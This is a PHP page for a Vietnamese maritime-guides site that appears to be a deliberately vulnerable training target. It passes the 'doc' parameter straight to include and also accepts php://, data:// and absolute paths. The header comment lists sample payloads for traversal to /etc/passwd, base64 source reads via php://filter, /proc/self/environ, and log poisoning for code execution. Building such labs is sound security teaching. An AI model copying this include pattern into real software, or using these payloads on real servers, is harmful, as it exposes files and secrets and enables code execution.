<?php
/**
 * guide.php — Cẩm nang & Quy chuẩn Hàng hải: /guide?doc=
 *
 * !!! ĐIỂM LỖI LFI: Local File Inclusion & Directory Traversal (CWE-22 / CWE-98) !!!
 * 'doc' được truyền trực tiếp vào lệnh include mà không kiểm tra whitelist hay hàm basename().
 * 
 * Payload mẫu khai thác (doc):
 *   1. Path Traversal đọc tệp hệ thống:
 *      /guide?doc=../../../../etc/passwd
 *      /guide?doc=../../../../etc/hosts
 *   2. Đọc mã nguồn ứng dụng qua PHP Wrapper (Base64):
 *      /guide?doc=php://filter/convert.base64-encode/resource=lib/db.php
 *      /guide?doc=php://filter/convert.base64-encode/resource=index.php
 *   3. Đọc biến môi trường container:
 *      /guide?doc=/proc/self/environ
 *   4. LFI to RCE qua Log Poisoning:
 *      /guide?doc=../../../../var/log/apache2/access.log
 */
render_header('Cẩm nang & Quy chuẩn Hàng hải');

$doc = $_GET['doc'] ?? 'incoterms2020.html';

echo '<div class="card"><h1>Cẩm nang &amp; Quy chuẩn Vận tải biển</h1>';
echo '<p class="muted">Tra cứu nhanh các quy tắc thương mại Incoterms 2020, điều ước quốc tế và quy trình nghiệp vụ cảng biển.</p>';

// Danh mục tài liệu mẫu
echo '<div style="margin: 15px 0 20px 0; display: flex; gap: 8px; flex-wrap: wrap;">';
echo '<a class="btn btn-sm" href="/guide?doc=incoterms2020.html">Incoterms 2020</a>';
echo '<a class="btn btn-sm" href="/guide?doc=bill_of_lading.html">Quy chuẩn Vận đơn B/L</a>';
echo '<a class="btn btn-sm" href="/guide?doc=customs_procedure.html">Thủ tục Thông quan</a>';
echo '<a class="btn btn-sm" href="/guide?doc=dangerous_goods.html">Hàng nguy hiểm IMO</a>';
echo '</div>';

// Form tra cứu tài liệu
echo '<form class="searchbar" action="/guide" method="get" style="margin-bottom: 16px;">';
echo '<input type="text" name="doc" value="' . htmlspecialchars($doc) . '" placeholder="Nhập tên tệp quy chuẩn (vd: incoterms2020.html)">';
echo '<button class="btn" type="submit">Xem tài liệu</button>';
echo '</form>';

// Xác định đường dẫn tệp mục tiêu (Hỗ trợ cả wrapper php://, absolute path và relative path)
if (str_starts_with($doc, 'php://') || str_starts_with($doc, 'data://') || str_starts_with($doc, '/')) {
    $target_file = $doc;
} else {
    $target_file = __DIR__ . '/../guides/' . $doc;
}

echo '<div class="query-box"><strong>Resolved File:</strong> ' . htmlspecialchars($target_file) . '</div>';

echo '<div style="background:#fff; padding:22px; border-radius:10px; border:1px solid #dce6ef; margin-top:14px; min-height:180px; overflow-x:auto;">';

// !!! ĐIỂM INJECT LFI: include trực tiếp biến $target_file !!!
try {
    if (@file_exists($target_file) || str_contains($doc, '..') || str_starts_with($doc, 'php://') || str_starts_with($doc, 'data://')) {
        // Nạp và hiển thị nội dung tệp
        include $target_file;
    } else {
        echo '<div class="sql-error"><strong>Lỗi:</strong> Không tìm thấy tệp tài liệu <code>' . htmlspecialchars($doc) . '</code> trong hệ thống.</div>';
    }
} catch (\Throwable $e) {
    echo '<div class="sql-error"><strong>LFI Execution Error:</strong> ' . htmlspecialchars($e->getMessage()) . '</div>';
}

echo '</div></div>';

render_footer();
